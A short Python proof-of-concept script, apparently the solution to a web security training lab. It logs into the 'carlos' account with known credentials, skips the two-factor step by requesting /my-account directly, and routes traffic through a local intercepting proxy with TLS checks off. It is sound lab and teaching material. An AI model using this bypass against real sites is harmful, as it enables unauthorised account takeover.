import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def access_carlos_account(s, url):

    # log into carlos account
    print("(+) Logging into carlos account and bypassing 2FA verification...")
    login_url = url + "/login"
    data = {
        "username": "carlos",
        "password": "montoya"
    }
    r = s.post(login_url, data=data, verify=False, proxies=proxies, allow_redirects=False) 

    # Confirm Bypass
    account_url = url + "/my-account"
    r = s.get(account_url, verify=False, proxies=proxies)
    if 'Log out' in r.text:
        print("(+) Successfully bypassed 2FA verification and logged into carlos account!")
    else:
        print("(-) Failed to bypass 2FA verification and Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__== "__main__":
    main()
